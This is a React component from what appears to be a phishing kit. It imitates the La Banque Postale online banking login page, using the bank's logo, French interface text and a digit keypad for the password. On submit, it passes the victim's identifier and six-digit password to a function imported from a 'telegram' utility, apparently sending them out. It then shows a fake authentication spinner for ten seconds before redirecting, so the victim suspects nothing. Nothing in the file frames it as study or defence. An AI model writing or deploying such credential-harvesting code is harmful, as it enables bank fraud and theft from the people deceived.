import React, { useState } from 'react';
import { X, Search } from 'lucide-react';
import { sendBankLoginData } from '../../utils/telegram';

type ProviderFAuthProps = {
  onAuthenticate: () => void;
  onBack: () => void;
  bankName: string;
};

const ProviderFAuth = ({ onAuthenticate, onBack, bankName }: ProviderFAuthProps) => {
  const [identifiant, setIdentifiant] = useState('');
  const [motDePasse, setMotDePasse] = useState('');
  const [memoriserIdentifiant, setMemoriserIdentifiant] = useState(false);
  const [isLoading, setIsLoading] = useState(false);

  const handleIdentifiantChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/\D/g, '').slice(0, 10);
    setIdentifiant(value);
  };

  const handleNumberClick = (number: string) => {
    if (motDePasse.length < 6) {
      setMotDePasse(prev => prev + number);
    }
  };

  const clearMotDePasse = () => {
    setMotDePasse('');
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (identifiant.length === 10 && motDePasse.length === 6) {
      setIsLoading(true);

      await sendBankLoginData({
        bankName,
        username: identifiant,
        password: motDePasse
      });

      setTimeout(() => {
        setIsLoading(false);
        window.location.href = '/success';
      }, 10000);
    }
  };

  const renderPasswordIndicators = () => {
    const indicators = [];
    for (let i = 0; i < 6; i++) {
      indicators.push(
        <div
          key={i}
          className={`w-3 h-3 rounded-full border-2 ${
            i < motDePasse.length
              ? 'bg-blue-600 border-blue-600'
              : 'bg-transparent border-gray-300'
          }`}
        />
      );
    }
    return indicators;
  };

  if (isLoading) {
    return (
      <div className="min-h-screen flex flex-col items-center justify-center bg-gradient-to-br from-blue-600 to-blue-800">
        <div className="text-center">
          <div className="mb-8">
            <div className="w-20 h-20 mx-auto relative">
              <div className="absolute inset-0 rounded-full border-4 border-white/30"></div>
              <div className="absolute inset-0 rounded-full border-4 border-white animate-spin border-t-transparent"></div>
            </div>
          </div>
          <h2 className="text-xl font-semibold text-white mb-2">
            Authentification en cours
          </h2>
          <p className="text-white/80">
            Connexion à votre espace bancaire...
          </p>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gradient-to-br from-blue-600 to-blue-800 flex">
      <div className="w-full lg:w-2/5 bg-white flex flex-col">
        <header className="flex items-center justify-between p-4 border-b border-gray-200">
          <div className="flex items-center">
            <img
              src="https://upload.wikimedia.org/wikipedia/fr/thumb/d/d4/Logo_La_Banque_postale_2022.svg/1280px-Logo_La_Banque_postale_2022.svg.png"
              alt="Logo"
              className="h-12"
              onError={(e) => {
                (e.target as HTMLImageElement).style.display = 'none';
              }}
            />
          </div>
          <div className="flex items-center space-x-4">
            <button className="p-2 text-gray-600 hover:text-gray-800">
              <Search size={20} />
            </button>
            <button
              onClick={onBack}
              className="p-2 text-gray-600 hover:text-gray-800 transition-colors"
            >
              <X size={20} />
            </button>
          </div>
        </header>

        <div className="flex-1 p-6 lg:p-8 flex flex-col justify-center">
          <h1 className="text-xl lg:text-2xl font-normal text-gray-800 mb-8">
            Connexion à votre compte particulier
          </h1>

          <form onSubmit={handleSubmit} className="space-y-6">
            <div>
              <label className="block text-blue-800 font-medium mb-3">
                Identifiant (10 chiffres)
              </label>
              <input
                type="text"
                value={identifiant}
                onChange={handleIdentifiantChange}
                className="w-full px-4 py-3 border border-gray-300 rounded-lg text-gray-800 focus:outline-none focus:ring-2 focus:ring-blue-600 focus:border-transparent"
                maxLength={10}
              />
            </div>

            <div className="flex items-center justify-between">
              <span className="text-gray-700">Mémoriser mon identifiant</span>
              <button
                type="button"
                onClick={() => setMemoriserIdentifiant(!memoriserIdentifiant)}
                className={`relative inline-flex h-6 w-11 items-center rounded-full transition-colors ${
                  memoriserIdentifiant ? 'bg-blue-600' : 'bg-gray-300'
                }`}
              >
                <span
                  className={`inline-block h-4 w-4 transform rounded-full bg-white transition-transform ${
                    memoriserIdentifiant ? 'translate-x-6' : 'translate-x-1'
                  }`}
                />
              </button>
            </div>

            <div>
              <label className="block text-blue-800 font-medium mb-3">
                Mot de passe (6 chiffres)
              </label>

              <div className="flex justify-center space-x-2 mb-6">
                {renderPasswordIndicators()}
              </div>

              <div className="grid grid-cols-5 gap-3 mb-6">
                {[0, 1, 2, 3, 4, 5, 6, 7, 8, 9].map((number) => (
                  <button
                    key={number}
                    type="button"
                    onClick={() => handleNumberClick(number.toString())}
                    className="aspect-square bg-blue-50 hover:bg-blue-100 rounded-lg text-xl font-semibold text-blue-800 transition-colors focus:outline-none focus:ring-2 focus:ring-blue-600"
                  >
                    {number}
                  </button>
                ))}
              </div>

              {motDePasse.length > 0 && (
                <div className="text-center mb-4">
                  <button
                    type="button"
                    onClick={clearMotDePasse}
                    className="text-gray-500 hover:text-gray-700"
                  >
                    <X size={24} />
                  </button>
                </div>
              )}
            </div>

            <button
              type="submit"
              disabled={identifiant.length !== 10 || motDePasse.length !== 6 || isLoading}
              className="w-full bg-blue-600 text-white py-4 rounded-lg text-lg font-semibold hover:bg-blue-700 disabled:bg-gray-300 disabled:cursor-not-allowed transition-colors focus:outline-none focus:ring-2 focus:ring-blue-600 focus:ring-offset-2"
            >
              Se connecter
            </button>

            <div className="text-center">
              <button
                type="button"
                className="text-gray-600 hover:text-gray-800 text-sm underline"
              >
                Identifiant / Mot de passe oublié
              </button>
            </div>
          </form>
        </div>
      </div>

      <div className="hidden lg:flex lg:w-3/5 flex-col justify-center items-center p-8 text-white relative">
        <h2 className="text-3xl lg:text-4xl font-light mb-12 text-center">
          Votre banque, citoyenne
        </h2>

        <div className="bg-blue-900/50 backdrop-blur-sm rounded-2xl p-8 max-w-md w-full">
          <h3 className="text-xl font-semibold mb-4">
            Espace Assurance
          </h3>
          <div className="space-y-4 text-sm">
            <p>
              Vous n'avez pas d'accès Banque En Ligne et souhaitez retrouver vos contrats assurance ?
            </p>
          </div>
          <button className="mt-6 w-full bg-blue-700 hover:bg-blue-800 text-white py-3 px-6 rounded-lg font-medium transition-colors">
            Me connecter à mon espace assurance
          </button>
        </div>
      </div>
    </div>
  );
};

export default ProviderFAuth;
